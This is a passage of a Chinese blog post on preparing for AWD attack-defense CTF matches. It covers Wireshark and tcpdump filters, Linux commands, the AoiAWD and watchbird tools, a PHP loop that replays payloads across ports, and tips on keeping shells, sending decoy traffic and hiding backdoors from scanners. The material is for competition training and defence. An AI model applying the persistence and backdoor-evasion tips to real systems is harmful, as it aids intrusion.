> (1) http.request.method == “GET” (2) http.request.method == “POST” (3) http.host mathes “www.baidu.com|[http://baidu.cn](https://link.zhihu.com/?target=http%3A//baidu.cn)“ #matches可以写多个域名 (4) http.host contains “[http://www.baidu.com](https://link.zhihu.com/?target=http%3A//www.baidu.com)“ #contain只能写一个域名 (5) http contains “GET” 例如： http.request.method ==”GET” &amp;&amp; http contains “Host: “ http.request.method == “GET” &amp;&amp; http contains “User-Agent: “ http.request.method ==”POST” &amp;&amp; http contains “Host: “ http.request.method == “POST” &amp;&amp; http contains “User-Agent: “ http contains “HTTP/1.1 200 OK” &amp;&amp; http contains “Content-Type: “ http contains “HTTP/1.0 200 OK” &amp;&amp; http contains “Content-Type: “

#### <a class="reference-link" name="TCPdump%E5%88%86%E6%9E%90"></a>TCPdump分析

> tcpdump采用命令行方式，它的命令格式为：tcpdump [-adeflnNOpqStvx0] [-c 数量] [-F 文件名] [-i 网络接口] [-r 文件名] [-s snaplen] [-T 类型] [-w 文件名] [表达式]

详细参数：

抓包选项：|作用 —-|— -c：|指定要抓取的包数量。 -i interface：|指定tcpdump需要监听的接口。默认会抓取第一个网络接口 -n|：对地址以数字方式显式，否则显式为主机名，也就是说-n选项不做主机名解析。 -nn：|除了-n的作用外，还把端口显示为数值，否则显示端口服务名。 -P：|指定要抓取的包是流入还是流出的包。可以给定的值为”in”、”out”和”inout”，默认为”inout”。 -s len：|设置tcpdump的数据包抓取长度为len，如果不设置默认将会是65535字节。对于要抓取的数据包较大时，长度设置不够可能会产生包截断，若出现包截断，输出行中会出现”[proto]”的标志(proto实际会显示为协议名)。但是抓取len越长，包的处理时间越长，并且会减少tcpdump可缓存的数据包的数量，从而会导致数据包的丢失，所以在能抓取我们想要的包的前提下，抓取长度越小越好。

输出选项：| 作用 ———|—- -e：|输出的每行中都将包括数据链路层头部信息，例如源MAC和目标MAC。 -q：|快速打印输出。即打印很少的协议相关信息，从而输出行都比较简短。 -X：|输出包的头部数据，会以16进制和ASCII两种方式同时输出。 -XX：|输出包的头部数据，会以16进制和ASCII两种方式同时输出，更详细。 -v：|当分析和打印的时候，产生详细的输出。 -vv：|产生比-v更详细的输出。 -vvv：|产生比-vv更详细的输出。

其他功能性选项：|作用 —-|—- -D：|列出可用于抓包的接口。将会列出接口的数值编号和接口名，它们都可以用于”-i”后。 -F：|从文件中读取抓包的表达式。若使用该选项，则命令行中给定的其他表达式都将失效。 -w：|将抓包数据输出到文件中而不是标准输出。可以同时配合”-G time|选项使得输出文件每time秒就自动切换到另一个文件。可通过”-r”选项载入这些文件以进行分析和打印。 -r：|从给定的数据包文件中读取数据。使用”-“表示从标准输入中读取。

#### <a class="reference-link" name="%E7%AB%AF%E5%8F%A3%E8%BF%87%E6%BB%A4"></a>端口过滤

```
抓取所有经过ens33，目的或源端口22的网络数据：
tcpdump -i ens33 port 22
指定源端口：tcpdump -i ens33 sec port 22
指定目的端口: tcpdump -i ens33 dst port 22
```

#### <a class="reference-link" name="%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4"></a>网络过滤

```
tcpdump -i ens33 net 192.168.1.1
tcpdump -i ens33 src net 192.168.1.1 #源端口
tcpdump -i ens33 dst net 192.168.1.1 #目的端口
```

#### <a class="reference-link" name="%E5%8D%8F%E8%AE%AE%E8%BF%87%E6%BB%A4"></a>协议过滤

```
tcpdump -i ens33 arp
tcpdump -i ens33 ip
tcpdump -i ens33 tcp
tcpdump -i ens33 udp
tcpdump -i ens33 icmp
tcpdump -w 1.pcap #抓所有包保存到1.pcap中然后使用wireshark分析
```

### <a class="reference-link" name="apache2%E6%97%A5%E5%BF%97"></a>apache2日志

/var/log/apache2/

/usr/local/apache2/logs

### <a class="reference-link" name="awd%E4%B8%ADlinux%E7%9A%84%E5%91%BD%E4%BB%A4"></a>awd中linux的命令

```
- netstat -anptl 查看开放端口

- ps aux 以用户为主的格式来查看所有进程

  pa aux | grep tomcat

  ps -A 显示进程信息

  ps -u root 显示root进程用户信息

  ps -ef 显示所有命令，连带命令行

- kill 终止进程

  kill -9 pid

  //kill -15、kill -9的区别

  执行kill（默认kill -15）命令，执行kill (默认kill-15) 命令，系统会发送一个SIGTERM信号给对应的程序，,大部分程序接收到SIGTERM信号后，会先kill -9命令,系统给对应程序发送的信号是SIGKILL,即exit。exit信号不会被系统阻塞，所以kill -9能顺利杀掉进程

- vim编辑器

  命令行模式下

  /  查找内容

  ?  查找内容

  n  重复上一条检索命令

  N  命令重复上一条检索命令
```



## 两个awd神器

### <a class="reference-link" name="AoiAWD"></a>AoiAWD

aoiawd地址：[https://github.com/DasSecurity-HatLab/AoiAWD](https://github.com/DasSecurity-HatLab/AoiAWD)

下载好，自己去编译或者找编译好的直接用

#### <a class="reference-link" name="%E4%BD%BF%E7%94%A8"></a>使用

把刚刚那些文件夹中的生成的文件例如xxx.phar等发送到提供给的靶机上去，然后记得赋予权限，ip是自己电脑ip，端口就是默认8023

```
# web的流量监控
chmod +x tapeworm.phar
# 进程监控
chmod +x roundworm
# pwn的监控
chmod +x guardian.phar

./tapeworm.phar -d 目录 -s ip:port
./roundworm  -w 目录 -s ip -p port
./guardian.phar -i 目录 -s ip:port


./tapeworm.phar -d /var/www/html -s ip
./roundworm  -w /var/www/html -s ip -p
./guardian.phar -i /var/www/html -s ip
```

本地需要在命令行启动aoiawd

启动方式：

```
php aoiawd.phar
```

[![](https://p2.ssl.qhimg.com/t01a5dd02b3671d1f0e.png)](https://p2.ssl.qhimg.com/t01a5dd02b3671d1f0e.png)

web端口1337

[![](https://p0.ssl.qhimg.com/t010bfbdbf40e09d0df.png)](https://p0.ssl.qhimg.com/t010bfbdbf40e09d0df.png)

token就是命令行启动时access token

成功进入页面

[![](https://p3.ssl.qhimg.com/t0136256c22abd9f3fc.png)](https://p3.ssl.qhimg.com/t0136256c22abd9f3fc.png)

左侧可以看到各个模块，使用方式非常简单

#### <a class="reference-link" name="%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3%E9%87%8D%E6%94%BE"></a>指定端口重放

需要将上边的单个ip的注释掉，下边的这个改ip和端口

```
// 批量端口
$ports = [10024, 10021, 10023];
$host1 = "http://" . '10.241.180.159';
foreach ($ports as $port) `{`
    $host = $host1 . ':' . $port;
    echo "Sending to: `{`$host`}`\n\n";
    sendPayload($host);
`}`
exit;
```

### <a class="reference-link" name="watchbird"></a>watchbird

这是个通防waf，支持流量转发和替换flag

地址：[https://github.com/leohearts/awd-watchbird](https://github.com/leohearts/awd-watchbird)



## Fix

一个大佬总结的漏洞快修思路

[https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/](https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/)

最后：

保持良好的心态，不到最后一刻都有翻盘的可能

找出漏洞拿到shell，权限维持后，尽量把这个洞给被控机修了，以免被别人拿到shell

不仅要保证自己能拿到shell，还有保证别人拿不到shell

拿shell前先打一波流量，混淆视听

保证自己的网站上没有d盾可以扫出来的后门

提高python脚本编写能力



## 优秀文章

[《CTF线下赛AWD模式下的生存技巧》](https://www.anquanke.com/post/id/84675)

[《论如何在CTF比赛中搅“shi”》](http://www.freebuf.com/articles/web/118149.html)

[《CTF线下防御战 — 让你的靶机变成“铜墙铁壁”》](https://www.anquanke.com/post/id/86984)

[AWD攻防赛webshell批量利用框架](https://github.com/Ares-X/AWD-Predator-Framework)

[针对ctf线下赛流量抓取(php)、真实环境流量抓取分析的工具](https://github.com/wupco/weblogger)

[AWD攻防赛脚本集合](https://github.com/admintony/Prepare-for-AWD)

[CTFDefense](https://github.com/ssooking/CTFDefense)
